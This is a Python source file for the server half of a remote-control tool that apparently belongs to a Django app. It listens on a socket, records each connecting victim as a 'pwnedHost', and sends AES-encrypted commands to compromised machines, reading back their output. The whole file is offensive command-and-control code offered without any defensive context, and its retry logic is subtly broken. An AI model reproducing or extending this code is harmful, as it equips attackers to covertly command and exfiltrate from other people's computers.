from Crypto.Cipher import AES
import time
from command_control.models import pwnedHost
import socket
import base64
import os


BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
iv = os.urandom(16)


def create_socket(user, interface, port, encryption_key):
    try:
        global s
        global sock
        global author
        global secret
        global cipher
        secret = encryption_key
        cipher = AES.new(secret, AES.MODE_CFB, iv)
        interface = interface
        port = port
        author = user
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((interface, port))
        s.listen(10)
    except socket.error as error_message:
        print(" Failed to Bind to " + str(interface) + ":" + str(port) + ":" + str(error_message))
        print("Retrying ..!!")
        time.sleep(5)
        create_socket(author, interface, port)


def sock_connect():
    global connect
    global ip_addr
    try:
        connect, ip_addr = s.accept()
        print("connection from %s:%s \n" % (ip_addr[0], ip_addr[1]))
        print("\n")
        user = connect.recv(1024)
        host = pwnedHost(author= author, ip=ip_addr[0], port=ip_addr[1], username= user)
        host.save()
    except socket.error as error_message:
        print(" Failed to Connect..!! " + str(error_message))


def command_control(command, id, ip_address):
    host = pwnedHost.objects.get(id=id, ip=ip_address)
    try:
        encrypted = EncodeAES(cipher, command)
        connect.sendto(encrypted,(host.ip,host.port))
        result = connect.recv(16384)
        return DecodeAES(cipher,result)
    except:
        host.delete()




